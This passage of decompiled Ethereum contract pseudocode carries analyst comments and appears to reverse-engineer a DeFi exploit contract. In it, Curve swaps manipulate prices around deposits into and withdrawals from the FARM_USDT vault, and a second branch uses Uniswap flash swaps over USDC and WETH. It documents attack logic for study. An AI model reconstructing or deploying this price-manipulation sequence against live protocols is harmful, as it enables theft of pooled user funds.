          args 0, 2, 1, 1001 * (ext_call.return_data * ext_call.return_data / 10^18 * usdt_threshold) + (ext_call.return_data * usdt_threshold) - (ext_call.return_data * usdt_threshold) / 1000 / 1000, 0
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]

      # gets balance from Farm_USDt
      require ext_code.size(0x53c80ea73dc6941f518a68e2fc52ac45bde7c9c)
      static call 0x53c80ea73dc6941f518a68e2fc52ac45bde7c9c.balanceOf(address owner) with:
              gas gas_remaining wei
             args this.address
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]
      
      # Withdraws from FARM_USDT
      require return_data.size >= 32
      require ext_code.size(0x53c80ea73dc6941f518a68e2fc52ac45bde7c9c)
      call 0x053c80ea73dc6941f518a68e2fc52ac45bde7c9c.withdraw(uint256 amount) with:
           gas gas_remaining wei
          args ext_call.return_data[0]
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]

      # Runs swap function on curve.fi
      require ext_code.size(0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51)
      call 0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51.0xa6417ed6 with:
           gas gas_remaining wei
          args 0, 1, 2, (ext_call.return_data * ext_call.return_data / 10^18 * usdt_threshold) + (ext_call.return_data * usdt_threshold) - (ext_call.return_data * usdt_threshold) / 1000, 0
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]

      # calls the USDT contract and gets balance
      require ext_code.size(0xdac17f958d2ee523a2206206994597c13d831ec7)
      static call 0xdac17f958d2ee523a2206206994597c13d831ec7.balanceOf(address owner) with:
              gas gas_remaining wei
             args this.address
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]

      # Deposits in to the FARM_USDT vault
      require return_data.size >= 32
      require ext_code.size(0x53c80ea73dc6941f518a68e2fc52ac45bde7c9c)
      call 0x053c80ea73dc6941f518a68e2fc52ac45bde7c9c.deposit(uint256 amount) with:
           gas gas_remaining wei
          args (ext_call.return_data * (ext_call.return_data * ext_call.return_data / 10^18 * usdt_threshold) + (ext_call.return_data * usdt_threshold) - (ext_call.return_data * usdt_threshold) / 1000 / 1000))
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]
      require ext_code.size(0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51)

      # Swaps on Curve.fi
      call 0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51.0xa6417ed6 with:
           gas gas_remaining wei
          args 0, 2, 1, 1001 * (ext_call.return_data * ext_call.return_data / 10^18 * usdt_threshold) + (ext_call.return_data * usdt_threshold) - (ext_call.return_data * usdt_threshold) / 1000 / 1000, 0
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]

      # Gets balance on FARM_USDT vault
      require ext_code.size(0x53c80ea73dc6941f518a68e2fc52ac45bde7c9c)
      static call 0x53c80ea73dc6941f518a68e2fc52ac45bde7c9c.balanceOf(address owner) with:
              gas gas_remaining wei
             args this.address
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]

      # Withdraws from FARM_USDT vault
      require return_data.size >= 32
      require ext_code.size(0x53c80ea73dc6941f518a68e2fc52ac45bde7c9c)
      call 0x053c80ea73dc6941f518a68e2fc52ac45bde7c9c.withdraw(uint256 amount) with:
           gas gas_remaining wei
          args ext_call.return_data[0]
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]

      # Gets usdt balance 
      require ext_code.size(0xdac17f958d2ee523a2206206994597c13d831ec7)
      static call 0xdac17f958d2ee523a2206206994597c13d831ec7.balanceOf(address owner) with:
              gas gas_remaining wei
             args this.address
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]

      # Transfers USDT
      require return_data.size >= 32
      if ext_call.return_data <= ext_call.return_data[0] + 165496489468:
          revert with 0, 'DEFENSE ENABLED'
      if not ext_code.size(0xdac17f958d2ee523a2206206994597c13d831ec7):
          revert with 0, 'Address: call to non-contract'
      mem[260 len 64] = transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10, 1193220178, 11680
      call 0xdac17f958d2ee523a2206206994597c13d831ec7.0x471f1852 with:
           gas gas_remaining wei
          args 0x2da00000000000000000000000000000000000000000000000000000000000000000, mem[324 len 4]
      if not return_data.size:
          if not ext_call.success:
              revert with transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10, 1193220178, 50165496489468
          if not transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10:
              revert with 0, 32, 42, 0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565, mem[370 len 22]
      else:
          mem[292 len return_data.size] = ext_call.return_data[0 len return_data.size]
          if not ext_call.success:
              if return_data.size:
                  revert with ext_call.return_data[0 len return_data.size]
              revert with 0, 'SafeERC20: low-level call failed'
          if return_data.size:
              require return_data.size >= 32
              if not mem[292]:
                  revert with 0, 
                              32,
                              42,
                              0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                              mem[ceil32(return_data.size) + 371 len 22]
  else:
      if _param1.length == 2:
          # Calls uniswap
          # This looks like another strategy to exploit using uniswap, weth, usdc, and usdt instead
          require ext_code.size(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc)
          call 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc.0x22c0d9f with:
               gas gas_remaining wei
              args 0, 2285707264, 0, this.address, 128, 3, '333'
          if not ext_call.success:
              revert with ext_call.return_data[0 len return_data.size]
          
          # Calls usdt contract
          require ext_code.size(0xdac17f958d2ee523a2206206994597c13d831ec7)
          static call 0xdac17f958d2ee523a2206206994597c13d831ec7.balanceOf(address owner) with:
                  gas gas_remaining wei
                 args this.address
          if not ext_call.success:
              revert with ext_call.return_data[0 len return_data.size]
          require return_data.size >= 32
          if not ext_code.size(0xdac17f958d2ee523a2206206994597c13d831ec7):
              revert with 0, 'Address: call to non-contract'
          if ext_call.return_data >= 10003 * stor0 / 9970:
              mem[260 len 64] = transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10, 0, Mask(224, 32, 10003 * stor0 / 9970) >> 32
              mem[324 len 0] = 0
              call 0xdac17f958d2ee523a2206206994597c13d831ec7.0x471f1852 with:
                   gas gas_remaining wei
                  args Mask(224, 32, 10003 * stor0 / 9970) << 224, mem[324 len 4]
              if not return_data.size:
                  if not ext_call.success:
                      revert with transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10, 0, 10003 * stor0 / 9970
                  if not transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10:
                      revert with 0, 32, 42, 0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565, mem[370 len 22]
                  require ext_code.size(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc)
                  static call 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc.getReserves() with:
                          gas gas_remaining wei
                  if not ext_call.success:
                      revert with ext_call.return_data[0 len return_data.size]
                  require return_data.size >= 96
                  if Mask(112, 0, ext_call.return_data <= 0:
                      revert with 0, 32, 40, 0x54556e697377617056324c6962726172793a20494e53554646494349454e545f4c49515549444954, mem[368 len 24]
                  if Mask(112, 0, ext_call.return_data <= 0:
                      revert with 0, 32, 40, 0x54556e697377617056324c6962726172793a20494e53554646494349454e545f4c49515549444954, mem[368 len 24]
                  if not Mask(112, 0, ext_call.return_data[0]):
                      if 20 * 10^18 > Mask(112, 0, ext_call.return_data[32]):
                          revert with 0, 'SafeMath: subtraction overflow'
                      require Mask(112, 0, ext_call.return_data[32]) - 20 * 10^18
                      if (997 * Mask(112, 0, ext_call.return_data / Mask(112, 0, ext_call.return_data[32]) - 20 * 10^18 != 997:
                          revert with 0, 32, 33, 0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[425 len 31]
                      require (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18
                      if (0 / (997 * Mask(112, 0, ext_call.return_data < 0 / (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18:
                          revert with 0, 'SafeMath: addition overflow'
                      require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
                      call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.transfer(address to, uint256 value) with:
                           gas gas_remaining wei
                          args 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc, (0 / (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18) + 1
                  else:
                      if 20 * 10^18 * Mask(112, 0, ext_call.return_data / Mask(112, 0, ext_call.return_data[0]) != 20 * 10^18:
                          revert with 0, 32, 33, 0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[361 len 31]
                      if not 20 * 10^18 * Mask(112, 0, ext_call.return_data[0]):
                          if 20 * 10^18 > Mask(112, 0, ext_call.return_data[32]):
                              revert with 0, 'SafeMath: subtraction overflow'
                          require Mask(112, 0, ext_call.return_data[32]) - 20 * 10^18
                          if (997 * Mask(112, 0, ext_call.return_data / Mask(112, 0, ext_call.return_data[32]) - 20 * 10^18 != 997:
                              revert with 0, 32, 33, 0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[425 len 31]
                          require (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18
                          if (0 / (997 * Mask(112, 0, ext_call.return_data < 0 / (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18:
                              revert with 0, 'SafeMath: addition overflow'
                          require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
                          call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.transfer(address to, uint256 value) with:
                               gas gas_remaining wei
                              args 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc, (0 / (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18) + 1
                      else:
                          # SafeMath calls
                          if 20000 * 10^18 * Mask(112, 0, ext_call.return_data / 20 * 10^18 * Mask(112, 0, ext_call.return_data[0]) != 1000:
                              revert with 0, 32, 33, 0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[361 len 31]
                          if 20 * 10^18 > Mask(112, 0, ext_call.return_data[32]):
                              revert with 0, 'SafeMath: subtraction overflow'
                          require Mask(112, 0, ext_call.return_data[32]) - 20 * 10^18
                          if (997 * Mask(112, 0, ext_call.return_data / Mask(112, 0, ext_call.return_data[32]) - 20 * 10^18 != 997:
                              revert with 0, 32, 33, 0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[425 len 31]
                          require (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18
                          if (20000 * 10^18 * Mask(112, 0, ext_call.return_data / (997 * Mask(112, 0, ext_call.return_data < 20000 * 10^18 * Mask(112, 0, ext_call.return_data / (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18:
                              revert with 0, 'SafeMath: addition overflow'

                          # Transfers usdc to uniswap??    
                          require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
                          call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.transfer(address to, uint256 value) with:
                               gas gas_remaining wei
                              args 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc, (20000 * 10^18 * Mask(112, 0, ext_call.return_data / (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18) + 1
                  if not ext_call.success:
                      revert with ext_call.return_data[0 len return_data.size]

                  # calls uniswap again
                  require return_data.size >= 32
                  require ext_code.size(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc)
                  call 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc.0x22c0d9f with:
                       gas gas_remaining wei
                      args 0, 20 * 10^18, this.address, 128, 0, mem[488]
                  if not ext_call.success:
                      revert with ext_call.return_data[0 len return_data.size]
                  if ext_call.return_data < 10003 * stor0 / 9970:
                      if not ext_code.size(0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2):
                          revert with 0, 'Address: call to non-contract'
                      mem[488 len 64] = 0, 0xd4a11d5eeaac28ec3f61d100daf4d40471f1852, 0
                      call 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2.0x471f1852 with:
                           gas gas_remaining wei
                          args 0, mem[424 len 28], mem[552 len 4]
                      if not return_data.size:
                          if not ext_call.success:
                              revert with transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10, 0, 10003 * stor0 / 9970
                          if not transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10:
                              revert with 0, 32, 42, 0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565, mem[598 len 22]
                      else:
                          mem[520 len return_data.size] = ext_call.return_data[0 len return_data.size]
                          if not ext_call.success:
                              if return_data.size:
                                  revert with ext_call.return_data[0 len return_data.size]
                              revert with 0, 'SafeERC20: low-level call failed'
                          if return_data.size:
                              require return_data.size >= 32
                              if not mem[520]:
                                  revert with 0, 
                                              32,
                                              42,
                                              0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                                              mem[ceil32(return_data.size) + 599 len 22]
              else:
                  mem[292 len return_data.size] = ext_call.return_data[0 len return_data.size]
                  if not ext_call.success:
                      if return_data.size:
                          revert with ext_call.return_data[0 len return_data.size]
                      revert with 0, 'SafeERC20: low-level call failed'
                  if not return_data.size:
                      require ext_code.size(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc)
                      static call 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc.getReserves() with:
                              gas gas_remaining wei
                      if not ext_call.success:
                          revert with ext_call.return_data[0 len return_data.size]
                      require return_data.size >= 96
                      if Mask(112, 0, ext_call.return_data <= 0:
                          revert with 0, 
                                      32,
                                      40,
                                      0x54556e697377617056324c6962726172793a20494e53554646494349454e545f4c49515549444954,
                                      mem[ceil32(return_data.size) + 369 len 24]
                      if Mask(112, 0, ext_call.return_data <= 0:
                          revert with 0, 
                                      32,
                                      40,
                                      0x54556e697377617056324c6962726172793a20494e53554646494349454e545f4c49515549444954,
                                      mem[ceil32(return_data.size) + 369 len 24]
                      if not Mask(112, 0, ext_call.return_data[0]):
                          if 20 * 10^18 > Mask(112, 0, ext_call.return_data[32]):
                              revert with 0, 'SafeMath: subtraction overflow'
                          require Mask(112, 0, ext_call.return_data[32]) - 20 * 10^18
                          if (997 * Mask(112, 0, ext_call.return_data / Mask(112, 0, ext_call.return_data[32]) - 20 * 10^18 != 997:
                              revert with 0, 
                                          32,
                                          33,
                                          0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                          mem[ceil32(return_data.size) + 426 len 31]
                          require (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18
                          if (0 / (997 * Mask(112, 0, ext_call.return_data < 0 / (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18:
                              revert with 0, 'SafeMath: addition overflow'
                          require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
                          call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.transfer(address to, uint256 value) with:
                               gas gas_remaining wei
                              args 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc, (0 / (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18) + 1
                          if not ext_call.success:
                              revert with ext_call.return_data[0 len return_data.size]
                          require return_data.size >= 32
                          require ext_code.size(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc)
                          call 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc.0x22c0d9f with:
                               gas gas_remaining wei
                              args 0, 20 * 10^18, this.address, 128, 0, mem[ceil32(return_data.size) + 489]
                          if not ext_call.success:
                              revert with ext_call.return_data[0 len return_data.size]
                          if ext_call.return_data < 10003 * stor0 / 9970:
                              # Calls the WETH contract
                              if not ext_code.size(0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2):
                                  revert with 0, 'Address: call to non-contract'
                              mem[ceil32(return_data.size) + 489 len 64] = 0, 0xd4a11d5eeaac28ec3f61d100daf4d40471f1852, 0
                              call 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2.0x471f1852 with:
                                   gas gas_remaining wei
                                  args 0, mem[ceil32(return_data.size) + 425 len 28], mem[ceil32(return_data.size) + 553 len 4]
                              if not return_data.size:
                                  if not ext_call.success:
                                      revert with transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10, 0, 10003 * stor0 / 9970
                                  if not transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10:
                                      revert with 0, 
                                                  32,
                                                  42,
                                                  0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                                                  mem[ceil32(return_data.size) + 599 len 22]
                              else:
                                  mem[ceil32(return_data.size) + 521 len return_data.size] = ext_call.return_data[0 len return_data.size]
                                  if not ext_call.success:
                                      if return_data.size:
                                          revert with ext_call.return_data[0 len return_data.size]
                                      revert with 0, 'SafeERC20: low-level call failed'
                                  if return_data.size:
                                      require return_data.size >= 32
                                      if not mem[ceil32(return_data.size) + 521]:
                                          revert with 0, 
                                                      32,
                                                      42,
                                                      0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                                                      mem[(2 * ceil32(return_data.size)) + 600 len 22]
                      else:
                          if 20 * 10^18 * Mask(112, 0, ext_call.return_data / Mask(112, 0, ext_call.return_data[0]) != 20 * 10^18:
                              revert with 0, 
                                          32,
                                          33,
                                          0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                          mem[ceil32(return_data.size) + 362 len 31]
                          if not 20 * 10^18 * Mask(112, 0, ext_call.return_data[0]):
                              if 20 * 10^18 > Mask(112, 0, ext_call.return_data[32]):
                                  revert with 0, 'SafeMath: subtraction overflow'
                              require Mask(112, 0, ext_call.return_data[32]) - 20 * 10^18
                              if (997 * Mask(112, 0, ext_call.return_data / Mask(112, 0, ext_call.return_data[32]) - 20 * 10^18 != 997:
                                  revert with 0, 
                                              32,
                                              33,
                                              0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                              mem[ceil32(return_data.size) + 426 len 31]
                              require (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18
                              if (0 / (997 * Mask(112, 0, ext_call.return_data < 0 / (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18:
                                  revert with 0, 'SafeMath: addition overflow'
                              require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
                              call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.transfer(address to, uint256 value) with:
                                   gas gas_remaining wei
                                  args 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc, (0 / (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18) + 1
                          else:
                              if 20000 * 10^18 * Mask(112, 0, ext_call.return_data / 20 * 10^18 * Mask(112, 0, ext_call.return_data[0]) != 1000:
                                  revert with 0, 
                                              32,
                                              33,
                                              0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                              mem[ceil32(return_data.size) + 362 len 31]
                              if 20 * 10^18 > Mask(112, 0, ext_call.return_data[32]):
                                  revert with 0, 'SafeMath: subtraction overflow'
                              require Mask(112, 0, ext_call.return_data[32]) - 20 * 10^18
                              if (997 * Mask(112, 0, ext_call.return_data / Mask(112, 0, ext_call.return_data[32]) - 20 * 10^18 != 997:
                                  revert with 0, 
                                              32,
                                              33,
                                              0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                              mem[ceil32(return_data.size) + 426 len 31]
                              require (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18
                              if (20000 * 10^18 * Mask(112, 0, ext_call.return_data / (997 * Mask(112, 0, ext_call.return_data < 20000 * 10^18 * Mask(112, 0, ext_call.return_data / (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18:
                                  revert with 0, 'SafeMath: addition overflow'
                              require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
                              call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.transfer(address to, uint256 value) with:
                                   gas gas_remaining wei
                                  args 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc, (20000 * 10^18 * Mask(112, 0, ext_call.return_data / (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18) + 1
                          if not ext_call.success:
                              revert with ext_call.return_data[0 len return_data.size]
                          require return_data.size >= 32
                          require ext_code.size(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc)
                          call 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc.0x22c0d9f with:
                               gas gas_remaining wei
                              args 0, 20 * 10^18, this.address, 128, 0, mem[ceil32(return_data.size) + 489]
                          if not ext_call.success:
                              revert with ext_call.return_data[0 len return_data.size]
                          if ext_call.return_data < 10003 * stor0 / 9970:
                              if not ext_code.size(0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2):
                                  revert with 0, 'Address: call to non-contract'
                              mem[ceil32(return_data.size) + 489 len 64] = 0, 0xd4a11d5eeaac28ec3f61d100daf4d40471f1852, 0
                              call 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2.0x471f1852 with:
                                   gas gas_remaining wei
                                  args 0, mem[ceil32(return_data.size) + 425 len 28], mem[ceil32(return_data.size) + 553 len 4]
                              if not return_data.size:
                                  if not ext_call.success:
                                      revert with transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10, 0, 10003 * stor0 / 9970
                                  if not transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10:
                                      revert with 0, 
                                                  32,
                                                  42,
                                                  0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                                                  mem[ceil32(return_data.size) + 599 len 22]
                              else:
                                  mem[ceil32(return_data.size) + 521 len return_data.size] = ext_call.return_data[0 len return_data.size]
                                  if not ext_call.success:
                                      if return_data.size:
                                          revert with ext_call.return_data[0 len return_data.size]
                                      revert with 0, 
                                                  'SafeERC20: low-level call failed',
                                                  mem[(2 * ceil32(return_data.size)) + 590 len (2 * ceil32(return_data.size)) - (2 * ceil32(return_data.size))]
                                  if return_data.size:
                                      require return_data.size >= 32
                                      if not mem[ceil32(return_data.size) + 521]:
                                          revert with 0, 
                                                      32,
                                                      42,
                                                      0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                                                      mem[(2 * ceil32(return_data.size)) + 600 len (2 * ceil32(return_data.size)) + (-2 * ceil32(return_data.size)) + 22]
                  else:
                      require return_data.size >= 32
                      if not mem[292]:
                          revert with 0, 
                                      32,
                                      42,
                                      0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                                      mem[ceil32(return_data.size) + 371 len 22]
                      require ext_code.size(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc)
                      # ?? Calls uniswap 
                      # USDC contract
                      # 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc
                      static call 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc.getReserves() with:
                              gas gas_remaining wei
                      if not ext_call.success:
                          revert with ext_call.return_data[0 len return_data.size]
                      require return_data.size >= 96
                      if Mask(112, 0, ext_call.return_data <= 0:
                          revert with 0, 
                                      32,
                                      40,
                                      0x54556e697377617056324c6962726172793a20494e53554646494349454e545f4c49515549444954,
                                      mem[ceil32(return_data.size) + 369 len 24]
                      if Mask(112, 0, ext_call.return_data <= 0:
                          revert with 0, 
                                      32,
                                      40,
                                      0x54556e697377617056324c6962726172793a20494e53554646494349454e545f4c49515549444954,
                                      mem[ceil32(return_data.size) + 369 len 24]
                      if not Mask(112, 0, ext_call.return_data[0]):
                          if 20 * 10^18 > Mask(112, 0, ext_call.return_data[32]):
                              revert with 0, 'SafeMath: subtraction overflow'
                          require Mask(112, 0, ext_call.return_data[32]) - 20 * 10^18
                          if (997 * Mask(112, 0, ext_call.return_data / Mask(112, 0, ext_call.return_data[32]) - 20 * 10^18 != 997:
                              revert with 0, 
                                          32,
                                          33,
                                          0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                          mem[ceil32(return_data.size) + 426 len 31]
                          require (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18
                          if (0 / (997 * Mask(112, 0, ext_call.return_data < 0 / (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18:
                              revert with 0, 'SafeMath: addition overflow'
                          require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
                          call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.transfer(address to, uint256 value) with:
                               gas gas_remaining wei
                              args 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc, (0 / (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18) + 1
                          if not ext_call.success:
                              revert with ext_call.return_data[0 len return_data.size]
                          require return_data.size >= 32
                          require ext_code.size(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc)
                          call 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc.0x22c0d9f with:
                               gas gas_remaining wei
                              args 0, 20 * 10^18, this.address, 128, 0, mem[ceil32(return_data.size) + 489]
                          if not ext_call.success:
                              revert with ext_call.return_data[0 len return_data.size]
                          if ext_call.return_data < 10003 * stor0 / 9970:
                              # weth contract
                              if not ext_code.size(0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2):
                                  revert with 0, 'Address: call to non-contract'
                              mem[ceil32(return_data.size) + 489 len 64] = 0, 0xd4a11d5eeaac28ec3f61d100daf4d40471f1852, 0
                              call 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2.0x471f1852 with:
                                   gas gas_remaining wei
                                  args 0, mem[ceil32(return_data.size) + 425 len 28], mem[ceil32(return_data.size) + 553 len 4]
                              if not return_data.size:
                                  if not ext_call.success:
                                      revert with transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10, 0, 10003 * stor0 / 9970
                                  if not transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10:
                                      revert with 0, 
                                                  32,
                                                  42,
                                                  0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                                                  mem[ceil32(return_data.size) + 599 len 22]
                              else:
                                  mem[ceil32(return_data.size) + 521 len return_data.size] = ext_call.return_data[0 len return_data.size]
                                  if not ext_call.success:
                                      if return_data.size:
                                          revert with ext_call.return_data[0 len return_data.size]
                                      revert with 0, 
                                                  'SafeERC20: low-level call failed',
                                                  mem[(2 * ceil32(return_data.size)) + 590 len (2 * ceil32(return_data.size)) - (2 * ceil32(return_data.size))]
                                  if return_data.size:
                                      require return_data.size >= 32
                                      if not mem[ceil32(return_data.size) + 521]:
                                          revert with 0, 
                                                      32,
                                                      42,
                                                      0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                                                      mem[(2 * ceil32(return_data.size)) + 600 len (2 * ceil32(return_data.size)) + (-2 * ceil32(return_data.size)) + 22]
                      else:
                          if 20 * 10^18 * Mask(112, 0, ext_call.return_data / Mask(112, 0, ext_call.return_data[0]) != 20 * 10^18:
                              revert with 0, 
                                          32,
                                          33,
                                          0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                          mem[ceil32(return_data.size) + 362 len 31]
                          if not 20 * 10^18 * Mask(112, 0, ext_call.return_data[0]):
                              if 20 * 10^18 > Mask(112, 0, ext_call.return_data[32]):
                                  revert with 0, 'SafeMath: subtraction overflow'
                              require Mask(112, 0, ext_call.return_data[32]) - 20 * 10^18
                              if (997 * Mask(112, 0, ext_call.return_data / Mask(112, 0, ext_call.return_data[32]) - 20 * 10^18 != 997:
                                  revert with 0, 
                                              32,
                                              33,
                                              0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                              mem[ceil32(return_data.size) + 426 len 31]
                              require (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18
                              if (0 / (997 * Mask(112, 0, ext_call.return_data < 0 / (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18:
                                  revert with 0, 'SafeMath: addition overflow'
                              require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
                              call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.transfer(address to, uint256 value) with:
                                   gas gas_remaining wei
                                  args 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc, (0 / (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18) + 1
                          else:
                              if 20000 * 10^18 * Mask(112, 0, ext_call.return_data / 20 * 10^18 * Mask(112, 0, ext_call.return_data[0]) != 1000:
                                  revert with 0, 
                                              32,
                                              33,
                                              0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                              mem[ceil32(return_data.size) + 362 len 31]
                              if 20 * 10^18 > Mask(112, 0, ext_call.return_data[32]):
                                  revert with 0, 'SafeMath: subtraction overflow'
                              require Mask(112, 0, ext_call.return_data[32]) - 20 * 10^18
                              if (997 * Mask(112, 0, ext_call.return_data / Mask(112, 0, ext_call.return_data[32]) - 20 * 10^18 != 997:
                                  revert with 0, 
                                              32,
                                              33,
                                              0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                              mem[ceil32(return_data.size) + 426 len 31]
                              require (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18
                              if (20000 * 10^18 * Mask(112, 0, ext_call.return_data / (997 * Mask(112, 0, ext_call.return_data < 20000 * 10^18 * Mask(112, 0, ext_call.return_data / (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18:
                                  revert with 0, 'SafeMath: addition overflow'
                              require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
